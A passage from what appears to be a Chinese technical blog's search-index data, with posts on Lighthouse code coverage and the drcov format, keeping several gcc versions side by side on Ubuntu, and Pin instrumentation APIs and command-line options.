","date":"2021-11-17","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/:6:6","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 3","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-3/"},{"categories":["Fuzz"],"content":"Lighthouse使用及改进","date":"2021-10-17","objectID":"/%E5%88%A9%E7%94%A8lighthouse%E8%BF%9B%E8%A1%8C%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1%E5%8F%8A%E5%85%B6%E4%BC%98%E5%8C%96/","tags":["Fuzz","Instrument","Pin"],"title":"利用Lighthouse进行覆盖率统计及其优化","uri":"/%E5%88%A9%E7%94%A8lighthouse%E8%BF%9B%E8%A1%8C%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1%E5%8F%8A%E5%85%B6%E4%BC%98%E5%8C%96/"},{"categories":["Fuzz"],"content":"TL;DR 介绍IDA覆盖率统计插件Lighthouse的使用，并对其覆盖率输出方式进行修改，获得可阅读的明文代码执行路径信息。 ","date":"2021-10-17","objectID":"/%E5%88%A9%E7%94%A8lighthouse%E8%BF%9B%E8%A1%8C%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1%E5%8F%8A%E5%85%B6%E4%BC%98%E5%8C%96/:1:0","tags":["Fuzz","Instrument","Pin"],"title":"利用Lighthouse进行覆盖率统计及其优化","uri":"/%E5%88%A9%E7%94%A8lighthouse%E8%BF%9B%E8%A1%8C%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1%E5%8F%8A%E5%85%B6%E4%BC%98%E5%8C%96/"},{"categories":["Fuzz"],"content":"1. 背景 最近有统计覆盖率信息的需求，多方搜索后发现IDA插件Lighthouse具有统计覆盖率的功能，通过读取DynamoRIO或者Pin产生的覆盖率日志文件，在IDA中以图形化形式展现代码的详细执行路径。 DynamoRIO或Pin等插桩工具默认使用的日志文件格式为drcov格式，这是一种二进制格式，每个基本块的信息的都是以十六进制数据进行记录。虽然二进制形式的记录方式有利于提高性能，但是人工阅读困难。 ","date":"2021-10-17","objectID":"/%E5%88%A9%E7%94%A8lighthouse%E8%BF%9B%E8%A1%8C%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1%E5%8F%8A%E5%85%B6%E4%BC%98%E5%8C%96/:2:0","tags":["Fuzz","Instrument","Pin"],"title":"利用Lighthouse进行覆盖率统计及其优化","uri":"/%E5%88%A9%E7%94%A8lighthouse%E8%BF%9B%E8%A1%8C%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1%E5%8F%8A%E5%85%B6%E4%BC%98%E5%8C%96/"},{"categories":["Fuzz"],"content":"2. Lighouse的基本使用 下载：Lighthouse； 安装： 在IDA中找到插件文件的目录： import idaapi, os; print(os.path.join(idaapi.get_user_idadir(), \"plugins\")) 将下载下来的源码中的/plugins/文件夹copy到上面命令执行结果的目录中，然后重启IDA。 获取drcov格式覆盖率统计日志文件： 首先使用Pin或DynamoRIO获取覆盖率统计文件(这里以Pin为例)： 这里需要注意的是，Lighthouse默认使用的drcov文件版本为version 2，但是最新版的DynamoRIO生成的drcov文件的版本为version 3，所以在导入IDA时会提示文件格式错误。Lighthouse目前提供了pin和frida的覆盖率统计插件，DynamoRIO的需要做修改或者使用旧版本的DynamoRIO： IDA中导入日志文件： 首先IDA加载要观察的可执行文件，然后File -\u003e Load file -\u003e Code coverage file... 加载刚刚生成的日志文件： 控制流图的蓝色基本块为执行了的基本块，右侧为coverage的overview信息 同样进行F5之后，可以看到执行过的伪代码： ","date":"2021-10-17","objectID":"/%E5%88%A9%E7%94%A8lighthouse%E8%BF%9B%E8%A1%8C%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1%E5%8F%8A%E5%85%B6%E4%BC%98%E5%8C%96/:3:0","tags":["Fuzz","Instrument","Pin"],"title":"利用Lighthouse进行覆盖率统计及其优化","uri":"/%E5%88%A9%E7%94%A8lighthouse%E8%BF%9B%E8%A1%8C%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1%E5%8F%8A%E5%85%B6%E4%BC%98%E5%8C%96/"},{"categories":["Fuzz"],"content":"3. drcov文件格式 ","date":"2021-10-17","objectID":"/%E5%88%A9%E7%94%A8lighthouse%E8%BF%9B%E8%A1%8C%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1%E5%8F%8A%E5%85%B6%E4%BC%98%E5%8C%96/:4:0","tags":["Fuzz","Instrument","Pin"],"title":"利用Lighthouse进行覆盖率统计及其优化","uri":"/%E5%88%A9%E7%94%A8lighthouse%E8%BF%9B%E8%A1%8C%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1%E5%8F%8A%E5%85%B6%E4%BC%98%E5%8C%96/"},{"categories":["Fuzz"],"content":"1. 简介 drcov是基于DynamoRIO框架的用于收集二进制程序覆盖率信息的一种工具，其收集的覆盖率信息格式即为drcov格式。因为其成熟高效的特点，很多进行覆盖率收集的工具都会使用这种格式。 DynamoRIO官方并未对drcov格式进行详细的说明，所以此处进行说明记录，希望能对后续的覆盖率信息收集工具的开发起到一定的作用 ","date":"2021-10-17","objectID":"/%E5%88%A9%E7%94%A8lighthouse%E8%BF%9B%E8%A1%8C%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1%E5%8F%8A%E5%85%B6%E4%BC%98%E5%8C%96/:4:1","tags":["Fuzz","Instrument","Pin"],"title":"利用Lighthouse进行覆盖率统计及其优化","uri":"/%E5%88%A9%E7%94%A8lighthouse%E8%BF%9B%E8%A1%8C%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1%E5%8F%8A%E5%85%B6%E4%BC%98%E5%8C%96/"},{"categories":["Fuzz"],"content":"2. 详细格式 首先，drcov格式有一个包含一些metadata的头部： DRCOV VERSION: 2 DRCOV FLAVOR: drcov 在Lighthouse中只支持了version 2的格式；DRCOV FLAVOR是一个描述产生覆盖率信息的工具的字符串，并没有具体的实际作用。 然后，是在收集覆盖率信息的过程中加载的模块的映射的模块表： Module Table: version 2, count 39 Columns: id, base, end, entry, checksum, timestamp, path 0, 0x10c83b000, 0x10c83dfff, 0x0000000000000000, 0x00000000, 0x00000000, /Users/ayrx/code/frida-drcov/bar 1, 0x112314000, 0x1123f4fff, 0x0000000000000000, 0x00000000, 0x00000000, /usr/lib/dyld 2, 0x7fff5d866000, 0x7fff5d867fff, 0x0000000000000000, 0x00000000, 0x00000000, /usr/lib/libSystem.B.dylib 3, 0x7fff5dac1000, 0x7fff5db18fff, 0x0000000000000000, 0x00000000, 0x00000000, /usr/lib/libc++.1.dylib 4, 0x7fff5db19000, 0x7fff5db2efff, 0x0000000000000000, 0x00000000, 0x00000000, /usr/lib/libc++abi.dylib 5, 0x7fff5f30d000, 0x7fff5fa93fff, 0x0000000000000000, 0x00000000, 0x00000000, /usr/lib/libobjc.A.dylib 8, 0x7fff60617000, 0x7fff60647fff, 0x0000000000000000, 0x00000000, 0x00000000, /usr/lib/system/libxpc.dylib ... snip ... 模块表的头部有两种变体，都包含模块表中的条目数： Format used in DynamoRIO v6.1.1 through 6.2.0 eg: 'Module Table: 11' Format used in DynamoRIO v7.0.0-RC1 (and hopefully above) eg: 'Module Table: version X, count 11' 每个版本的表格格式有些许不同： DynamoRIO v6.1.1, table version 1: eg: (Not present) DynamoRIO v7.0.0-RC1, table version 2: Windows: 'Columns: id, base, end, entry, checksum, timestamp, path' Mac/Linux: 'Columns: id, base, end, entry, path' DynamoRIO v7.0.17594B, table version 3: Windows: 'Columns: id, containing_id, start, end, entry, checksum, timestamp, path' Mac/Linux: 'Columns: id, containing_id, start, end, entry, path' DynamoRIO v7.0.17640, table version 4: Windows: 'Columns: id, containing_id, start, end, entry, offset, checksum, timestamp, path' Mac/Linux: 'Columns: id, containing_id, start, end, entry, offset, path' 虽然有很多列的数值，但是实际上能于Lighthouse交互的数据只有以下几种： id: 生成模块表时分配的序号，稍后用于将基本块映射到模块。 start, base: 模块开始的内存基地址。 end: 模块结束的内存地址。 path: 模块在硬盘上的存储路径。 最后，日志文件有一个基本块表，其中包含在收集覆盖信息时执行的基本块列表。虽然drcov可以以文本格式转储基本块表（使用-dump_text选项），但它默认以二进制格式转储表。 BB Table: 861 bbs \u003cbinary data\u003e 该表首先是一个表头，表明基本块的数量。后续跟的数据是一个每个8字节大小的__bb_entry_t结构组成的数组，__bb_entry_t的结构如下： typedef struct _bb_entry_t { uint start; /* offset of bb start from the image base */ ushort size; ushort mod_id; } bb_entry_t; 结构解释如下： start: 距离基本块入口开始的模块的基地址的偏移。 size: 基本块的大小。 mod_id: 发现的基本块所在模块的id，与前面模块表中的id是对应的。 基于上面3个元素，就可以知道哪个基本块被执行了，从而作为覆盖率信息进行收集。 ","date":"2021-10-17","objectID":"/%E5%88%A9%E7%94%A8lighthouse%E8%BF%9B%E8%A1%8C%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1%E5%8F%8A%E5%85%B6%E4%BC%98%E5%8C%96/:4:2","tags":["Fuzz","Instrument","Pin"],"title":"利用Lighthouse进行覆盖率统计及其优化","uri":"/%E5%88%A9%E7%94%A8lighthouse%E8%BF%9B%E8%A1%8C%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1%E5%8F%8A%E5%85%B6%E4%BC%98%E5%8C%96/"},{"categories":["Fuzz"],"content":"3. 修改输出方式为明文(以Pin插件为例) 因为Lighthouse默认输出的覆盖率日志文件时drcov格式的，人工阅读存在一定的困难。在某些场景下，需要直接获得人工易读的代码执行路径信息，所以考虑对Lighthouse的覆盖率统计插件进行修改。 Lighthouse的覆盖率统计功能在如下代码中： # CodeCoverage.cpp static VOID OnFini(INT32 code, VOID* v) { ...snap... drcov_bb tmp; for (const auto\u0026 data : context.m_terminated_threads) { for (const auto\u0026 block : data-\u003em_blocks) { auto address = block.first; auto it = std::find_if(context.m_loaded_images.begin(), context.m_loaded_images.end(), [\u0026address](const LoadedImage\u0026 image) { return address \u003e= image.low_ \u0026\u0026 address \u003c image.high_; }); if (it == context.m_loaded_images.end()) continue; tmp.id = (uint16_t)std::distance(context.m_loaded_images.begin(), it); tmp.start = (uint32_t)(address - it-\u003elow_); tmp.size = data-\u003em_blocks[address]; context.m_trace-\u003ewrite_binary(\u0026tmp, sizeof(tmp)); } } } 首先设置了一个drcov_bb结构tmp，其完整格式如下： struct __attribute__((packed)) drcov_bb { uint32_t start; uint16_t size; uint16_t id; }; 然后进入到一个内外嵌套循环中，在每个内循环中每读到一个bb信息就对tmp结构进行赋值： tmp.id = (uint16_t)std::distance(context.m_loaded_images.begin(), it); tmp.start = (uint32_t)(address - it-\u003elow_); tmp.size = data-\u003em_blocks[address]; 最后调用write_binary函数写入到trace文件中： context.m_trace-\u003ewrite_binary(\u0026tmp, sizeof(tmp)); 而write_binary函数的实现在Trace.h文件中： void write_binary(const void* ptr, size_t size) { if (fwrite(ptr, size, 1, m_file) != 1) { std::cerr \u003c\u003c \"Could not log to the log file.\" \u003c\u003c std::endl; std::abort(); } } 可以看到本质上就是调用fwrite函数进行流操作。此外，还有一个write_string函数： void write_string(const char* format, ...) { va_list args; va_start(args, format); if (vfprintf(m_file, format, args) \u003c 0) { std::cerr \u003c\u003c \"Could not log to the log file.\" \u003c\u003c std::endl; std::abort(); } va_end(args); } 该函数用作想trace文件中写入string格式的数据。这么一来就好办了，直接用现成的即可，只需要修改在写文件时的操作就ok了。修改后的代码如下： // drcov_bb tmp; 这里要注释掉。否则有的环境会报编译不通过 for (const auto\u0026 data : context.m_terminated_threads) { for (const auto\u0026 block : data-\u003em_blocks) { auto address = block.first; auto it = std::find_if(context.m_loaded_images.begin(), context.m_loaded_images.end(), [\u0026address](const LoadedImage\u0026 image) { return address \u003e= image.low_ \u0026\u0026 address \u003c image.high_; }); if (it == context.m_loaded_images.end()) continue; uint16_t id = (uint16_t)std::distance(context.m_loaded_images.begin(), it); uint32_t start_addr = (uint32_t)(address - it-\u003elow_); int size = data-\u003em_blocks[address]; context.m_trace-\u003ewrite_string(\"[+]module: [%d] 0x%08x %d\\n\", id, start_addr, size); } } 这种格式只能用作人工阅读或进一步的处理，没有办法再使用drcov2lcov和genhtml工具进行转换了，最终实现的效果如下： 会以明文形式打印出每个模块的执行的基本块的地址和块大小，这样就方便人工进行阅读，还可以进一步提取出模块执行的地址，进行后续处理。 ","date":"2021-10-17","objectID":"/%E5%88%A9%E7%94%A8lighthouse%E8%BF%9B%E8%A1%8C%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1%E5%8F%8A%E5%85%B6%E4%BC%98%E5%8C%96/:5:0","tags":["Fuzz","Instrument","Pin"],"title":"利用Lighthouse进行覆盖率统计及其优化","uri":"/%E5%88%A9%E7%94%A8lighthouse%E8%BF%9B%E8%A1%8C%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1%E5%8F%8A%E5%85%B6%E4%BC%98%E5%8C%96/"},{"categories":["LINUX"],"content":"记录一下多版本gcc共存的解决方案。","date":"2021-10-07","objectID":"/%E5%A4%9A%E7%89%88%E6%9C%ACgcc%E5%85%B1%E5%AD%98%E6%96%B9%E6%A1%88/","tags":["LINUX","gcc"],"title":"多版本gcc共存方案","uri":"/%E5%A4%9A%E7%89%88%E6%9C%ACgcc%E5%85%B1%E5%AD%98%E6%96%B9%E6%A1%88/"},{"categories":["LINUX"],"content":"前言 有时需要进行交叉编译的时候，可能需要在高版本的架构上编译一个低版本的工具来运行到一个旧平台上。高版本的架构一般自带的都是高版本工具，这样编译出来的工具无法在低版本架构上运行，所以就有了多版本编译器共存的情况。这里我们以 gcc 为例简单说一下多版本 gcc 共存的解决方案，其实很简单。 ","date":"2021-10-07","objectID":"/%E5%A4%9A%E7%89%88%E6%9C%ACgcc%E5%85%B1%E5%AD%98%E6%96%B9%E6%A1%88/:1:0","tags":["LINUX","gcc"],"title":"多版本gcc共存方案","uri":"/%E5%A4%9A%E7%89%88%E6%9C%ACgcc%E5%85%B1%E5%AD%98%E6%96%B9%E6%A1%88/"},{"categories":["LINUX"],"content":"安装低版本gcc/g++ 在高版本的 Linux 上的源里是不能直接 apt 去安装低版本的 gcc/g++ 的，所以这里简单记录下如何在高版本的 Ubuntu 上也可以直接 apt 安装。 换源 既然高版本的源里没有安装包，直接更新一下低版本的源好了。以 gcc-4.8 为例，这里首先把 ubuntu 16.04 的源更新到 /etc/apt/sources.list中去： # official deb http://dk.archive.ubuntu.com/ubuntu/ xenial main deb http://dk.archive.ubuntu.com/ubuntu/ xenial universe # 国内源aliyun deb http://mirrors.aliyun.com/ubuntu/ xenial main deb-src http://mirrors.aliyun.com/ubuntu/ xenial main deb http://mirrors.aliyun.com/ubuntu/ xenial-updates main deb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates main deb http://mirrors.aliyun.com/ubuntu/ xenial universe deb-src http://mirrors.aliyun.com/ubuntu/ xenial universe deb http://mirrors.aliyun.com/ubuntu/ xenial-updates universe deb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates universe deb http://mirrors.aliyun.com/ubuntu/ xenial-security main deb-src http://mirrors.aliyun.com/ubuntu/ xenial-security main deb http://mirrors.aliyun.com/ubuntu/ xenial-security universe deb-src http://mirrors.aliyun.com/ubuntu/ xenial-security universe 然后 sudo apt update 一下，把包资源更新进来。 安装 可以先查看一下版本信息：sudo apt-cache policy gcc-4.8 ，作用类似于搜索，下面所有能安装的子版本都会列出来。然后直接 apt install 对应的版本即可。 这种方法不管想安装什么版本的旧软件，只要有对应的更新源即可。 ","date":"2021-10-07","objectID":"/%E5%A4%9A%E7%89%88%E6%9C%ACgcc%E5%85%B1%E5%AD%98%E6%96%B9%E6%A1%88/:2:0","tags":["LINUX","gcc"],"title":"多版本gcc共存方案","uri":"/%E5%A4%9A%E7%89%88%E6%9C%ACgcc%E5%85%B1%E5%AD%98%E6%96%B9%E6%A1%88/"},{"categories":["LINUX"],"content":"版本控制 第一种方法： 直接在使用时指定 CC 或 CXX，跟上对应版本的 gcc/g++ 的绝对路径即可。个人感觉这样会更方便一点，只要在编译的时候指定一下变量即可。 第二种方法： 设置优先级： $ sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-4.8 40 $ sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-9 90 $ sudo update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++4.8 40 $ sudo update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++-9 90 # 数字越大，表示优先级越高，上面的例子中就是优先使用 gcc-9 ，这个具体的数字不用特别关注，只要能体现出来大小来表达优先级就可以。 删除设置的优先级： $ sudo update-alternatives --remove /usr/bin/g+±4.8 切换版本可以通过以下命令： $ sudo update-alternatives --config gcc $ sudo update-alternatives --config g++ 选择对应的数字即可，然后回车即可切换版本。 ","date":"2021-10-07","objectID":"/%E5%A4%9A%E7%89%88%E6%9C%ACgcc%E5%85%B1%E5%AD%98%E6%96%B9%E6%A1%88/:3:0","tags":["LINUX","gcc"],"title":"多版本gcc共存方案","uri":"/%E5%A4%9A%E7%89%88%E6%9C%ACgcc%E5%85%B1%E5%AD%98%E6%96%B9%E6%A1%88/"},{"categories":["Fuzz"],"content":"Pin学习记录第二篇","date":"2021-10-07","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/"},{"categories":["Fuzz"],"content":"本文是Pin系列学习记录的第二篇，主要是官方文档的相关内容的整理总结。 ","date":"2021-10-07","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/:0:0","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/"},{"categories":["Fuzz"],"content":"4. Callbacks 这部分主要介绍几个Pin的用于注册回调函数的API： INS_AddInstrumentFunction (INSCALLBACK fun, VOID *val)：注册以指令粒度插桩的函数 TRACE_AddInstrumentFunction (TRACECALLBACK fun, VOID *val)：注册以trace粒度插桩的函数 RTN_AddInstrumentFunction (RTNCALLBACK fun, VOID *val)：注册以routine粒度插桩的函数 IMG_AddInstrumentFunction (IMGCALLBACK fun, VOID *val)：注册以image粒度插桩的函数 PIN_AddFiniFunction (FINICALLBACK fun, VOID *val)：注册在应用程序退出前执行的函数，该类函数不进行插桩，可以有多个。 PIN_AddDetachFunction (DETACHCALLBACK fun, VOID *val)：注册在Pin通过PIN_Detach()函数放弃对应用程序的控制权限之前执行的函数，一个进程只调用一次，可以被任何线程调用，此时Pin的内存并没有释放。 对于每个注册函数的第二个参数val将在“回调”时传递给回调函数。如果在实际的场景中不需要传递第二个参数，为了保证安全，可以传递将val的值设置为0进行传递。val的理想使用方式是传递一个指向类实例的指针，这样回调函数在取消引用该指针前需要将其转换回一个对象。 所有的注册函数都会返回一个PIN_CALLBACK对象，该对象可以在后续过程中用于操作注册的回调的相关属性。 ","date":"2021-10-07","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/:1:0","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/"},{"categories":["Fuzz"],"content":"PIN callbacks manipulation API 在注册函数返回PIN_CALLBACK对象后，可以使用PIN_CALLBACKAPI对其进行操作，来检索和修改在Pin中已注册的回调函数的属性。 声明： typedef COMPLEX_CALLBACKVAL_BASE * PIN_CALLBACK 函数： CALLBACK_GetExecutionOrder() 声明： VOID CALLBACK_GetExecutionOrder (PIN_CALLBACK callback) 作用：获取已注册回调函数的执行顺序。越靠前，越早被执行。 参数：callback，从*_Add*Funcxtion()函数返回的注册的回调函数 CALLBACK_SetExecutionOrder() 声明： VOID CALLBACK_SetExecutionOrder (PIN_CALLBACK callback, CALL_ORDER order) 作用：设置已注册回调函数的执行顺序。越靠前，越早被执行。 参数：callback，从*_Add*Funcxtion()函数返回的注册的回调函数；order，新设置的回调函数的执行顺序。 PIN_CALLBACK_INVALID() 声明： const PIN_CALLBACK PIN_CALLBACK_INVALID(0) PIN回调的无效值。 ","date":"2021-10-07","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/:1:1","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/"},{"categories":["Fuzz"],"content":"CALL_ORDER CALL_ORDER是一个枚举类型，预定义了IARG_CALL_ORDER的值。其作用就是当指令有多个分析函数调用时，控制每个分析函数的调用顺序，默认值为CALL_ORDER_DEFAULT。 CALL_ORDER_FIRST：首先执行该调用，整数值为100. CALL_ORDER_DEFAULT：未指定IARG_CALL_ORDER时的默认值，整数值为200. CALL_ORDER_LAST：最后执行该调用，整数值为300. 在进行数值设定时，可以使用类似CALL_ORDER_DEFAULT + 5的格式来设置。 针对在相同插桩回调环境中的针对同一指令的、具备同样CALL_ORDER的多个分析调用，Pin会按照插入的顺序进行调用。 ","date":"2021-10-07","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/:1:2","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/"},{"categories":["Fuzz"],"content":"5. Mopdifying Application Instructions 虽然Pin的主要用途是对二进制程序进行插桩，但是它也可以实现对程序指令的修改。 ","date":"2021-10-07","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/:2:0","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/"},{"categories":["Fuzz"],"content":"5.1 实现方式 最简单的实现方式是插入一个分析routine来模拟指令执行，然后调用INS_Delete()来删除指令。也可以通过直接或间接插入程序执行流分支（使用INS_InsertDirectJump和INS_InsertIndirectJump）实现，这种方式会改变程序的执行流，但是会更容易实现指令模拟。 INS_InsertDirectJump() 声明： VOID INS_InsertDirectJump(INS ins, IPOINT ipoint, ADDRINT tgt) 参数： ins：输入的指令 ipoint：与ins相关的location（仅支持IPOINT_BEFORE和IPOINT_AFTER） tgt：target的绝对地址 作用：插入相对于给定指令的直接跳转指令，与INS_Delete()配合使用可以模拟控制流转移指令。 INS_InsertIndirectJump() 声明： VOID INS_InsertIndirectJump ( INS ins, IPOINT ipoint, REG reg) 参数： ins：输入的指令 ipoint：与ins相关的location（仅支持IPOINT_BEFORE和IPOINT_AFTER reg：target的寄存器 作用：插入相对于给定指令的间接跳转指令，与INS_Delete()配合使用可以模拟控制流转移指令。 ","date":"2021-10-07","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/:2:1","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/"},{"categories":["Fuzz"],"content":"5.2 指令内存修改 对于原始指令使用到的内存的访问，可以通过使用INS_RewriteMemoryOperand来引用通过分析routine计算得到的值来替代。 需要注意的是，对于指令的修改操作，会在所有的指令插桩操作完成后进行，因此在进行指令插桩时，插桩routine看到的都是原始的、没有经过修改的程序指令。 INS_RewriteMemoryOperand() 声明： VOID INS_RewriteMemoryOperand(INS ins, UINt32 memindex, REG newBase) 参数： ins：输入指令 memindex：控制需要重写的内存操作数（0，1，…） newBase：包含新操作数地址的寄存器，通常是通过PIN_ClainToolRegister分配的临时寄存器 作用：更改此内存访问指令以饮用包含在给定特定寄存器中的虚拟内存地址。 在IA-32和Intel 64平台上，修改后的操作数仅使用具有新基址寄存器newBase的基址寄存器进行寻址。原始指令中该操作数的任何index， scale或者offset filed都会被删除。 该函数可以用于重写内存操作数，包括隐式的（如call、ret、push、pop），唯一不能重写的指令是第二个操作数大于0的enter。 newBase中的地址是中是该操作数将访问的最低地址，如果操作数在内存访问之前被指令修改，如push，则newBase中的值将不是堆栈指针，而是指令访问的内存地址。 用于内存地址重写的一个样例插桩代码如下： // 映射originalEa到一个翻译后的地址 static ADDRINT ProcessAddress(ADDRINT originalEa, ADDRINT size, UINT32 access); ... for (UINT32 op = 0; op\u003cINS_MemoryOperandCount(ins); op++) // 首先遍历内存操作指令进行计数 { UINT32 access = (INS_MemoryOperandIsRead(ins,op) ? 1 : 0) | // 判断是内存读还是内存写 (INS_MemoryOperandIsWritten(ins,op) ? 2 : 0); INS_InsertCall(ins, IPOINT_BEFORE, AFUNPTR(ProcessAddress), IARG_MEMORYOP_EA, op, IARG_MEMORYOP_SIZE, op, IARG_UINT32, access, IARG_RETURN_REGS, REG_INST_G0+i, IARG_END); // 在指令处进行插桩 INS_RewriteMemoryOperand(ins, i, REG(REG_INST_G0+i)); // 重写内存指令的操作数 } ","date":"2021-10-07","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/:2:2","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/"},{"categories":["Fuzz"],"content":"6. Applying a Pintool to an Application 命令行： pin [pin-option]... -t [toolname] [tool-options]... -- [application] [application-option].. ","date":"2021-10-07","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/:3:0","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-2/"},{"categories":["Fuzz"],"content":"6.1 Pin Cmdline Options 如下是Pin的命令行的完整option列表： Option Description -follow_execv 使用Pin执行由execv类系统调用产生的所有进程 -help 帮助信息 -pause_tool 暂停并打印PID以可以在tool加载后attach到debugger，处理过程在‘n’秒后重启 -logfile 指定log文件的名字和路径，默认路径为当前工作目录，默认文件名为pin.log -unique_logfile 添加pid到log文件名中 -error_file 指定error文件的名字和路径，默认路径为当前工作目录。如果设置了error文件，则所有error都会写入到文件中，并且不会在console中显示。如果没有指定，则不创建文件。 -unique_error_file 添加pid到error文件名中 -injection 的选项为dynamic， self， child， parent，只能在UNIX中使用，详看Injection，默认使用dynamic。 -inline 内联简单的分析routine -log_inline 在pin.log文件中记录哪些分析routine被设置成了内联 -cc_memory_size 最大代码缓存，字节为单位。0为默认值，表示不做限制。必须设置为代码缓存块大小的对齐倍数。 -pid \u003cpid #\u003e 使用Pin和Pintool attach一个正在运行的进程 -pin_memory_range 限制Pin到一个内存范围内，0x80000000:0x90000000 or size: 0:0x10000000. -restric_memory 阻止Pin的动态加载器使用该地址范围：0x10000000:0x20000000 -pin_memory_size 限制Pin和Pintool可以动态分配的字节数。Pin分配的字节数定义为Pin分配的内存页数乘以页大小。 -tool_load_option 加载有附加标志的tool。 -t 指定加载的Pintool。 -t64 \u003c64-bit toolname\u003e 指定针对Intel 64架构的64-bit的Pintool。 -p32 指定IA-32架构下的Pintool -p64 指定针对Intel 64架构的Pintool -smc-support 是否开启app的SMC功能，1开启，0关闭。默认开启 -smc_strict 是否开启基本块内部的SMC，1开始，0关闭。默认关闭 -appdebug 调试目标程序，程序运行后立即在debugger中断下 -appdebug_enable 开启目标程序调试功能，但是在程序运行后不暂停 -appdebug_silent 当程序调试功能开启时，Pin打印消息告知如何连接外部debugger。但是在-appdebug_connection选项开启时不打印。 -appdebug_exclude 当程序调试功能开启，并指定了-follw_execv时，默认在所有子进程上启用调试。 -appdebug_allow_remote 允许debugger与Pin不运行在同一系统上，而是以远程方式进行连接。指定 -appdebug_connection 时会忽略该选项的值，因为 -appdebug_connection 明确指定了运行debugger的machine。 -appdebug_connection 当程序开启调试时，Pin默认会开启一个TCP端口等待debugger的连接。在开启该选项时，会在debugger中开启一个TCP端口来等待Pin的连接，相当于反置了默认的机制。该选项的格式为\"[ip]:port\"，“ip”以点十进制格式表达，如果省略了ip，则会连接本地的端口，端口号为十进制表示。需要注意的是，debugger为GDB时，不使用该选项。 -detach_reattach 允许在probe模式下进行detach和reattach，仅在Windows平台下使用。 -debug_instrumented_processes 允许debugger对经过插桩的进程进行attach，仅在Windows平台下使用。 -show_asserts 健全性检查 此外，还支持如下的tool options，它们需要跟在tool名字后面，但是要在--符号前： Option Description -logifle 指定log文件的名字和路径，默认路径为当前工作目录，默认文件名为pintool.log -unique_logfile 添加pid到log文件名中 -discard_line_info \u003cmodule_name\u003e 忽略特定模块的信息，模块名应该为没有路径的短文件名，不能是符号链接 -discard_line_info_all 忽略所有模块的信息 -help 帮助信息 -support_jit_api 